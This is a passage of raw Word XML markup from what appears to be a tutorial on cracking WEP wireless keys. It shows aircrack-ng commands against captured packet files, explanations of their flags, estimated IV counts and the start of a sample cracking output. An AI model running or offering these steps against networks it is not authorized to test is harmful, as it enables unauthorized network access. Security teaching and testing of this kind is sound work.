        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D25B8AC" w14:textId="4466EA58" w:rsidR="002B7D39" w:rsidRPr="002D638E" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:14:6C:7E:40:80 output*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B391819" w14:textId="77777777" w:rsidR="00EE3BA5" w:rsidRDefault="00EE3BA5" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B2A47D7" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20130D80" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 selects the one access point we are interested in. This is optional since when we originally captured the data, we applied a filter to only capture data for this one AP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F9ADDC" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>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proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>output</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>*.cap selects all files starting with “output” and ending in ”.cap”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7052B866" w14:textId="77777777" w:rsidR="002A56B4" w:rsidRDefault="002A56B4" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="268F99E7" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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To also use the FMS/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Korek</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> method, start another console session and enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30880389" w14:textId="77777777" w:rsidR="002A56B4" w:rsidRDefault="002A56B4" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E10099C" w14:textId="30791785" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -K -b 00:14:6C:7E:40:80 output*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CFC7DC7" w14:textId="77777777" w:rsidR="002A56B4" w:rsidRDefault="002A56B4" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="784D8594" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510A6BC9" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>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-K invokes the FMS/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Korek</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> method</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D5E2F3" w14:textId="27D8DB8B" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 </w:t>
      </w:r>
      <w:r w:rsidR="00215312">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Access Point mac address</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03705175" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>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proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>output</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>*.cap selects all files starting with “output” and ending in ”.cap”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F1AC6E" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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If you are using 1.0-rc1, add the option ”-K” for the FMS/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>KoreK</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack. (1.0-rc1 defaults to PTW.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="045C25C2" w14:textId="77777777" w:rsidR="00DF676D" w:rsidRDefault="00DF676D" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75B56F3B" w14:textId="77777777" w:rsidR="00203DFA" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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 xml:space="preserve">You will need approximately 250,000 IVs for 64 bit and </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C940159" w14:textId="77777777" w:rsidR="00203DFA" w:rsidRDefault="00203DFA" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35048B4D" w14:textId="77777777" w:rsidR="00203DFA" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>1,500,000 IVs for 128 bit keys.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185E40AA" w14:textId="30440431" w:rsidR="00EE3BA5" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>If you are using the PTW attack, then you will need about 20,000 packets for 64-bit and 40,000 to 85,000 packets for 128 bit.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> These are very approximate and there are many variables as to how many IVs you actually need to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3F8FEA" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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Here is what success looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678109D4" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                              </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0.9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C62FF21" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE26B28" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7535B306" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                              [00:03:06] Tested 674449 keys (got 96610 IVs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2821D0B0" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344FABCE" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> KB    depth   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>byte(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>vote)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7EDCB1" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  0    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>/  9</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   12(  15) F9(  15) 47(  12) F7(  12) FE(  12) 1B(   5) 77(   5) A5(   3) F6(   3) 03(   0) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E570DA" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  1    0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>/  8</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   34(  61) E8(  27) E0(  24) 06(  18) 3B(  16) 4E(  15) E1(  15) 2D(  13) 89(  12) E4(  12) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D275375" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
